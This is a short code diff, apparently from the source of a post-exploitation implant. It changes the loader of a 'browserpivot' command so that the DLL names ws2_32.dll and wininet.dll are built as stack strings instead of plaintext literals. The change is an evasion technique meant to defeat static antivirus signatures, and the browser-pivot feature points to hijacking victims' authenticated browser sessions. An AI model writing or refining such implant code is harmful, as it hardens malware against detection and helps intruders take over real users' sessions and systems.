@@ -4,6 +4,7 @@
 #include <parser.h>
 #include <config.h>
 #include <strings.h>
+#include <stackstr.h>
 #include <browserpivot.h>
 
 #ifdef INCLUDE_CMD_BROWSERPIVOT
@@ -20,9 +21,9 @@ static auto declfn resolve_bp_apis(
 ) -> bool {
 
     /* --- load ws2_32.dll ---------------------------------------- */
+    STK_WS2_32(_n1);
     state->h_ws2 = reinterpret_cast<HMODULE>(
-        inst.kernel32.LoadLibraryA(
-            symbol<const char*>( const_cast<char*>( "ws2_32.dll" ) ) ) );
+        inst.kernel32.LoadLibraryA( _n1 ) );
 
     if ( !state->h_ws2 )
         return false;
@@ -107,9 +108,9 @@ static auto declfn resolve_bp_apis(
         return false;
 
     /* --- load wininet.dll --------------------------------------- */
+    STK_WININET(_n2);
     state->h_wininet = reinterpret_cast<HMODULE>(
-        inst.kernel32.LoadLibraryA(
-            symbol<const char*>( const_cast<char*>( "wininet.dll" ) ) ) );
+        inst.kernel32.LoadLibraryA( _n2 ) );
 
     if ( !state->h_wininet )
         return false;
